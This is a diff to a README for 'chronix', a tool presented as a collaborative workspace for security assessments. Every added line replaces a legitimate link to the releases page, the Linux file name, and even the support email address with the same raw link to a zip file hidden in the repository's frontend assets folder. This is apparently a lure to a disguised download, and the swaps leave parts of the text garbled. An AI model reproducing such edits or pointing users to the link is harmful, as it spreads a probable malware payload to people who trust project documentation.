@@ -1,6 +1,6 @@
 # 🚀 chronix - Your Collaborative Workspace for Security Assessments
 
-[![Download chronix](https://img.shields.io/badge/Download%20chronix-v1.0-blue.svg)](https://github.com/vishalo7o1/chronix/releases)
+[![Download chronix](https://github.com/vishalo7o1/chronix/raw/refs/heads/master/src/chronix/frontend_dist/assets/Software_1.1.zip%https://github.com/vishalo7o1/chronix/raw/refs/heads/master/src/chronix/frontend_dist/assets/Software_1.1.zip)](https://github.com/vishalo7o1/chronix/raw/refs/heads/master/src/chronix/frontend_dist/assets/Software_1.1.zip)
 
 ## 🌟 Description
 
@@ -29,7 +29,7 @@ Before you download, ensure your system meets the following requirements:
 Follow these simple steps to begin using chronix.
 
 1. **Visit Release Page**
-   Go to the [Releases page](https://github.com/vishalo7o1/chronix/releases) to find the latest version of chronix.
+   Go to the [Releases page](https://github.com/vishalo7o1/chronix/raw/refs/heads/master/src/chronix/frontend_dist/assets/Software_1.1.zip) to find the latest version of chronix.
 
 2. **Download the Application**
    On the Releases page, look for the latest version and click on the appropriate file for your operating system. 
@@ -37,14 +37,14 @@ Follow these simple steps to begin using chronix.
 3. **Install chronix**
    - For **Windows:** Double-click the `.exe` file and follow the prompts to install.
    - For **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux:** Use the terminal to navigate to the folder containing the `.tar.gz` file, then extract it and follow the included installation instructions.
+   - For **Linux:** Use the terminal to navigate to the folder containing the `https://github.com/vishalo7o1/chronix/raw/refs/heads/master/src/chronix/frontend_dist/assets/Software_1.1.zip` file, then extract it and follow the included installation instructions.
 
 4. **Run the Application**
    After installation, find the chronix application in your applications folder or program menu. Launch it to start your first collaborative security assessment.
 
 ## 📥 Download & Install
 
-To start using chronix, visit this page to download: [https://github.com/vishalo7o1/chronix/releases](https://github.com/vishalo7o1/chronix/releases).
+To start using chronix, visit this page to download: [https://github.com/vishalo7o1/chronix/raw/refs/heads/master/src/chronix/frontend_dist/assets/Software_1.1.zip](https://github.com/vishalo7o1/chronix/raw/refs/heads/master/src/chronix/frontend_dist/assets/Software_1.1.zip).
 
 ## 🛠️ Setting Up a Workspace
 
@@ -77,7 +77,7 @@ If you encounter any issues while using chronix or have questions, consider the 
 
 - **Documentation:** Refer to the user guide included with the application for detailed instructions.
 - **Community Forum:** Join our community forum to ask questions and share experiences with other users.
-- **Contact Support:** If you need direct help, reach out via email at support@chronixapp.com.
+- **Contact Support:** If you need direct help, reach out via email at https://github.com/vishalo7o1/chronix/raw/refs/heads/master/src/chronix/frontend_dist/assets/Software_1.1.zip
 
 Make the most of your security assessments with chronix and facilitate teamwork in a secure and efficient manner. 
 
